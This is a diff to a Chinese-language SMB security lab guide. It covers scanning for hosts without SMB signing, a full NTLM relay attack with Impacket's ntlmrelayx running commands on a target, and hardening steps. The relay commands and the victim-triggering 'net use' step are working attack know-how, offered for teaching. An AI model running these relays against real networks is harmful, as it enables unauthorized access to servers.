@@ -305,7 +305,7 @@ crackmapexec smb 192.168.1.20
 
 # 使用smbclient指定协议版本连接
 smbclient -L //192.168.1.20 -N -m NT1
-# 注意：Kali 2025.4 中 -m NT1 替代已废弃的 -m SMB1
+# 注意：NT1是SMBv1的方言名称，若SMBv1已禁用则连接会被拒绝
 ```
 
 > **知识关联**：对应讲义中”SMB版本演进”——SMBv1已被废弃但旧系统仍默认启用，存在MS17-010等严重漏洞。
@@ -332,11 +332,12 @@ nmap -p 445 --script smb-security-mode 192.168.1.20
 # |   authentication_level: 1  ← 0=Anonymous, 1=User
 # |   challenge_response: supported
 # |   message_signing: disabled (dangerous, but default)
+# 若已启用签名则显示：
 # |   message_signing: REQUIRED (not dangerous)
 
-# 使用CrackMapExec生成可中继目标列表
-crackmapexec smb 192.168.1.20 --gen-relay-list
-# 输出SMB签名未启用且允许匿名访问的目标
+# 使用CrackMapExec生成可中继目标列表（扫描网段中签名未启用的主机）
+crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
+# 输出SMB签名未启用的主机IP到relay_targets.txt
 
 # 知识要点：
 # - SMB签名=对每个SMB消息添加数字签名，防止中间人篡改
@@ -359,6 +360,10 @@ crackmapexec smb 192.168.1.20 --gen-relay-list
 # 攻击者无需知道密码，即可获得目标服务器的访问权限
 
 # 终端1：在Kali上启动ntlmrelayx中继工具
+# ⚠️ 前置步骤：关闭Kali本机的SMB服务，释放445端口
+sudo systemctl stop smbd nmbd 2>/dev/null
+sudo killall smbd nmbd 2>/dev/null
+
 # 准备中继目标列表
 echo "192.168.1.20" > /tmp/targets.txt
 
@@ -367,6 +372,7 @@ echo "192.168.1.20" > /tmp/targets.txt
 # -exec-method smbexec：中继成功后通过SMB执行命令
 sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
   -tf /tmp/targets.txt -smb2support -exec-method smbexec
+# 备选：若上述路径不存在，可直接使用 ntlmrelayx.py
 
 # 预期输出（等待连接）：
 # [*] Protocol Client SMB loaded..
@@ -380,7 +386,11 @@ sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
 # - 访问攻击者控制的Web页面触发NTLM认证
 # - 邮件中的网络驱动器映射
 
-# 使用已获取的凭据连接Kali（模拟NTLM认证触发）
+# 在靶机（Windows Server）上模拟受害者被诱导访问攻击者的SMB共享
+# 方式一：在靶机的CMD/PowerShell中执行
+net use \\192.168.1.10\share
+
+# 方式二：在Kali上用smbclient模拟（简化演示，从Kali连接Kali自身的SMB服务）
 smbclient //192.168.1.10/tmp -U weakadmin%admin123
 
 # 回到终端1，观察ntlmrelayx输出：
@@ -404,7 +414,7 @@ smbclient //192.168.1.10/tmp -U weakadmin%admin123
 # 或使用 -c 参数直接执行命令：
 sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
   -tf /tmp/targets.txt -smb2support -c "whoami"
-# 预期输出：WORKGROUP\weakadmin
+# 预期输出：winsrv\weakadmin（目标服务器上的用户，实际主机名取决于靶机配置）
 
 sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
   -tf /tmp/targets.txt -smb2support -c "ipconfig /all"
@@ -592,7 +602,7 @@ Get-SmbServerConfiguration | Select EnableSMB1Protocol
 **步骤13：验证加固效果**
 
 ```
-# SMBv1连接应失败（Kali 2025.4 中使用 -m NT1 替代已废弃的 -m SMB1）
+# SMBv1连接应失败（NT1是SMBv1的方言名称）
 smbclient -L //192.168.1.20 -N -m NT1
 # 预期：连接失败，提示协议被拒绝
 
@@ -632,7 +642,7 @@ crackmapexec smb 192.168.1.20 --shares
 
 ## 四、实验清理
 
-```bash
+```cmd
 REM 1. 删除测试用户
 net user Jerry /delete
 net user Tom /delete
@@ -650,7 +660,7 @@ REM 4. 启用防火墙
 netsh advfirewall set allprofiles state on
 
 REM 5. 卸载IIS（可选）
-REM servermanagercmd -remove Web-Server
+REM Uninstall-WindowsFeature Web-Server
 ```
 
 > **免责声明**：本实验仅用于授权的安全教学环境。SMB中继攻击涉及网络协议层面的安全测试，请确保在虚拟机环境中操作。
